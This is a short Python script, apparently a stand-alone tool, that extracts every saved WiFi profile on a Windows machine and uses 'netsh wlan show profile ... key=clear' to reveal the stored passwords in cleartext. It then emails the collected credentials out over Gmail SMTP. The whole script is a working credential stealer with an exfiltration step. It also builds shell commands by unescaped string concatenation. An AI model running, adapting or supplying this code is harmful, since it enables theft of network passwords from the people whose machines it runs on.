#!/usr/bin/env python

import smtplib
import subprocess
import re


def send_mail(email, password, message):
    """
    Sends an email using the provided email address, password, and message.

    Args:
        email (str): The sender's email address.
        password (str): The sender's email password.
        message (str): The message to send.

    Note:
        Before running the code, make sure to replace the email address and password with valid credentials.
    """
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def get_wifi_profiles():
    """
    Retrieves the names of all saved WiFi profiles on the system.

    Returns:
        list: A list of WiFi profile names.

    Note:
        Before running the code, make sure to replace the email address and password with valid credentials.
    """
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    network_names_list = re.findall(rb"(?:Profile\s*:\s)(.*)", networks)

    # Clean up network profile names
    network_names_list = [name.replace(b'\r', b'') for name in network_names_list]

    return network_names_list


def get_wifi_passwords(network_names):
    """
    Retrieves the passwords for the specified WiFi profiles.

    Args:
        network_names (list): A list of WiFi profile names.

    Returns:
        str: A string containing the WiFi profile names and passwords.
    """
    result = ""

    for network_name in network_names:
        # Use .decode() to convert bytes to a string
        network_name_str = network_name.decode('utf-8')
        command = 'netsh wlan show profile "' + network_name_str + '" key=clear'
        current_result = subprocess.check_output(command, shell=True)
        result += current_result.decode('utf-8')

    return result

"""
 Note:
        Before running the code, make sure to replace the email address and password with valid credentials.
"""

# Set the email and password for sending the WiFi profiles and passwords
email = ""
password = ""

# Get the WiFi profiles and passwords
wifi_profiles = get_wifi_profiles()
wifi_passwords = get_wifi_passwords(wifi_profiles)

# Send the WiFi profiles and passwords via email
send_mail(email, password, wifi_passwords)
